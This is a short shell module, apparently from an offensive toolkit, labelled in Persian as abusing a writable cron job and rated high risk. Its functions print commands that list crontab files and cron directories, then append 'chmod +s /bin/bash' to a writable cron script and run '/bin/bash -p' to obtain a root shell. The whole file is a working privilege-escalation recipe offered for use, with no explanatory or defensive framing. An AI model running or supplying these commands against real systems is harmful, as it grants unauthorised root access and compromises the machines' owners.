DESC="سوءاستفاده از کران قابل نوشتن"
REQ="shell"
RISK="HIGH"

termux(){ echo "cat /etc/crontab; ls -la /etc/cron.d/"; }

kali(){
cat <<'EOF'
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null
# اگر اسکریپت کران قابل نوشتن بود:
echo 'chmod +s /bin/bash' >> /path/to/script.sh
# بعد:
/bin/bash -p
EOF
}
